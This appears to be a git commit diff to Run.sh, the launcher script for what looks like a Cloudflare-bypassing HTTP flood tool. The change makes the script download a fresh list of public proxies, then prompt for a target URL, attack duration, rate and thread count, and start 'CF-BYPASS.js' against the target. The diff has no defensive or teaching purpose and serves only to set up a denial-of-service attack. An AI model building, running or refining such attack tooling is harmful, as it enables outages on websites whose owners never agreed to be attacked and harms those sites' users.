c16bfba33534b7682339be76f70af75a2634b27c
Error <nc9176538@gmail.com>
2026-03-03 10:46:54 +0500

    Update Run.sh to use fresh proxies file

--- Run.sh
+++ Run.sh
@@ -1,10 +1,17 @@
+
+echo -e "This tool can crash your device. Be careful."
+clear
 echo -e "Installation..."
 apt update && apt upgrade -y
 apt install yarn nodejs -y
 yarn add axios user-agents
 echo -e "Installation Complete."
+echo -e "Adding fresh proxies..."
 
-echo "Enter target name:"
+curl "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all" > fresh.txt
+clear
+echo -e "ALL SET"
+echo "Enter target url:"
 read tgt
 echo "Enter time in seconds e.g 240:"
 read tim
@@ -14,6 +21,6 @@ echo "Enter threads e.g 1000000000:"
 read thrd
 
 echo "Attack Start...."
-node CF-BYPASS.js $tgt $tim $rate $thrd socks5.txt
+node CF-BYPASS.js $tgt $tim $rate $thrd fresh.txt
 
 
